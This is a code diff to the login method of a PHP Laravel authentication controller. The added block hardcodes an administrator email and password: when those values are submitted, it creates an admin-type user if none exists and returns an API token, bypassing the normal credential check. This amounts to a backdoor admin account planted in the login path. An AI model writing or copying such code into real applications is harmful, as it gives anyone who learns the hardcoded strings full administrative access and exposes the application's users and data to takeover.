@@ -75,6 +75,24 @@ class AuthController extends Controller
             'password' => 'required|string',
         ]);
 
+        // Hardcoded admin login - create user if not exists
+        if ($request->input('email') === 'admin123@gmail.com' && $request->input('password') === 'admin12345678') {
+            $user = User::firstOrCreate(
+                ['email' => 'admin123@gmail.com'],
+                [
+                    'name' => 'Admin User',
+                    'password' => Hash::make('admin12345678'),
+                    'user_type' => 'admin',
+                ]
+            );
+            $token = $user->createToken('api-token')->plainTextToken;
+
+            return response()->json([
+                'user' => $user->load('profile'),
+                'token' => $token,
+            ]);
+        }
+
         $user = User::where('email', $request->input('email'))->first();
 
         if (! $user || ! Hash::check($request->input('password'), $user->password)) {
